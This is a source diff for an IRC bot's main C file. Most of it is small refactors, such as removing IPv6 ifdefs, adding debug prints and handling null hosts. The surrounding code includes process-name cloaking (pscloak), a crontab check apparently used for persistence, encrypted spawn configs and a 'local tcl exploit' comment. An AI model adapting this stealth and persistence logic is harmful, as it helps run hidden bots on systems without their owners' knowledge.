@@ -127,7 +127,7 @@ int	use_stderr = 1;		/* Send stuff to stderr instead of logfiles? */
 int	do_restart = 0;		/* .restart has been called, restart asap */
 int	die_on_sighup = 0;	/* die if bot receives SIGHUP */
 int	die_on_sigterm = 0;	/* die if bot receives SIGTERM */
-int	resolve_timeout = 15;	/* hostname/address lookup timeout */
+int	resolve_timeout = 10;	/* hostname/address lookup timeout */
 char	quit_msg[1024];		/* quit message */
 time_t	now;			/* duh, now :) */
 
@@ -253,11 +253,7 @@ void write_debug()
      *       _not_ safe <cybah>
      */
     x = creat("DEBUG.DEBUG", 0600);
-#ifdef USE_IPV6
-    setsock(x, SOCK_NONSOCK, AF_INET);
-#else
     setsock(x, SOCK_NONSOCK);
-#endif /* USE_IPV6 */
     if (x >= 0) {
       strncpyz(s, ctime(&now), sizeof s);
       dprintf(-x, "Debug (%s) written %s\n", ver, s);
@@ -280,11 +276,7 @@ void write_debug()
 	 cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
 //  putlog(LOG_MISC, "*", "* Please REPORT this BUG to bryan (send him ~/DEBUG as well)!");
   x = creat("DEBUG", 0600);
-#ifdef USE_IPV6
-  setsock(x, SOCK_NONSOCK, AF_INET);
-#else
   setsock(x, SOCK_NONSOCK);
-#endif /* USE_IPV6 */
   if (x < 0) {
     putlog(LOG_MISC, "*", "* Failed to write DEBUG");
   } else {
@@ -936,13 +928,7 @@ static inline void garbage_collect(void)
   else
     run_cnt++;
 }
-/*
-static void do_arg(char *s)
-{
-  if (s[0] != '-')
-    strncpyz(configfile, s, sizeof configfile);
-}
-*/
+
 int crontab_exists() {
   char buf[2048], *out=NULL;
   sprintf(buf, STR("crontab -l | grep \"%s\" | grep -v \"^#\""), binname);
@@ -1038,7 +1024,10 @@ static void gotspawn(char *filename)
     temps = (char *) decrypt_string(netpass, decryptit(templine));
 
     pscloak = atoi(newsplit(&temps));
-
+#ifdef S_PSCLOAK
+    if (SDEBUG)
+      printf("GOTSPAWN, NOT CLOAKING\n");
+#endif /* S_PSCLOAK */
     nick = newsplit(&temps);
     if (!nick)
       fatal("invalid config (2).",0);
@@ -1076,7 +1065,7 @@ static void gotspawn(char *filename)
     }
   }
   fclose(fp);
-  unlink(filename);
+//  unlink(filename);
 }
 
 static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, int cloak)
@@ -1093,7 +1082,7 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
   if (!(fp = fopen(buf, "w")))
     fatal("Cannot create spawnfiles...", 0);
 
-  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip, host, ipsix);
+  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip, host ? host : ".", ipsix ? ipsix : ".");
 
   fflush(fp);
   fclose(fp);
@@ -1530,6 +1519,10 @@ Context;
         }
       } else if (c[0] == '!') { //local tcl exploit
         if (c[1] == '-') { //dont use pscloak
+#ifdef S_PSCLOAK
+          if (SDEBUG)
+            printf("NOT CLOAKING\n");
+#endif /* S_PSCLOAK */
           pscloak = 0;
         } else {
           newsplit(&temps);
@@ -1683,13 +1676,6 @@ Context;
   }
 
 #ifdef LEAF
-{
-  long test = iptolong(getmyip(1));
-  test = 0;
-}
-#endif
-
-#ifdef LEAF
 #ifdef S_PSCLOAK
   if (pscloak) {
     int on = 0;
@@ -1755,7 +1741,7 @@ Context;
   if (!backgrd && term_z) {
     int n = new_dcc(&DCC_CHAT, sizeof(struct chat_info));
 
-    dcc[n].addr = iptolong(getmyip(1));
+    dcc[n].addr = iptolong(getmyip());
     dcc[n].sock = STDOUT;
     dcc[n].timeval = now;
     dcc[n].u.chat->con_flags = conmask;
@@ -1769,11 +1755,7 @@ Context;
       userlist = adduser(userlist, "HQ", "none", "-", USER_ADMIN | USER_OWNER | USER_MASTER | USER_VOICE | USER_OP | USER_PARTY | USER_CHUBA | USER_HUBA);
       dcc[n].user = get_user_by_handle(userlist, "HQ");
     }
-#ifdef USE_IPV6
-    setsock(STDOUT, 0, AF_INET); /* Entry in net table */
-#else
     setsock(STDOUT, 0);          /* Entry in net table */
-#endif /* USE_IPV6 */
     dprintf(n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
     dcc_chatter(n);
   }
